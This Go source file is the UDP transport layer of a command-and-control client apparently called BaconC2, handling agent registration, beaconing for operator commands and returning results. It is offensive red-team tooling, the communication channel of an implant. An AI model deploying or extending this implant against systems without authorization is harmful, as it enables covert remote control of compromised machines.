package transport

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
)

type UDPTransport struct {
	serverHost string
	serverPort int
	agentID    string
	conn       *net.UDPConn
	mu         sync.Mutex
}

func NewUDPTransport(host string, port int, agentID string) models.ITransportProtocol {
	return &UDPTransport{
		serverHost: host,
		serverPort: port,
		agentID:    agentID,
	}
}

func (t *UDPTransport) Initialize() error {
	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", t.serverHost, t.serverPort))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to UDP server: %w", err)
	}

	t.mu.Lock()
	t.conn = conn
	t.mu.Unlock()

	return nil
}

func (t *UDPTransport) Register(agent models.Agent) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return fmt.Errorf("UDP connection not initialized")
	}

	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("UDP registration error: %w", err)
	}

	return nil
}

func (t *UDPTransport) Beacon() (models.Command, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	var emptyCmd models.Command

	if t.conn == nil {
		return emptyCmd, fmt.Errorf("UDP connection not initialized")
	}

	// Send beacon message
	beacon := struct {
		ID string `json:"id"`
	}{ID: t.agentID}
	jsonData, err := json.Marshal(beacon)
	if err != nil {
		return emptyCmd, fmt.Errorf("failed to marshal beacon: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return emptyCmd, fmt.Errorf("UDP beacon error: %w", err)
	}

	t.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buffer := make([]byte, 4096)
	n, _, err := t.conn.ReadFromUDP(buffer)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return emptyCmd, nil // Timeout means no command
		}
		return emptyCmd, fmt.Errorf("UDP read error: %w", err)
	}

	var cmd models.Command
	if err := json.Unmarshal(buffer[:n], &cmd); err != nil {
		return emptyCmd, fmt.Errorf("failed to unmarshal command: %w", err)
	}

	return cmd, nil
}

func (t *UDPTransport) SendResult(agentID string, result models.Command) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return fmt.Errorf("UDP connection not initialized")
	}

	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("UDP result send error: %w", err)
	}

	return nil
}

func (t *UDPTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn != nil {
		return t.conn.Close()
	}
	return nil
}
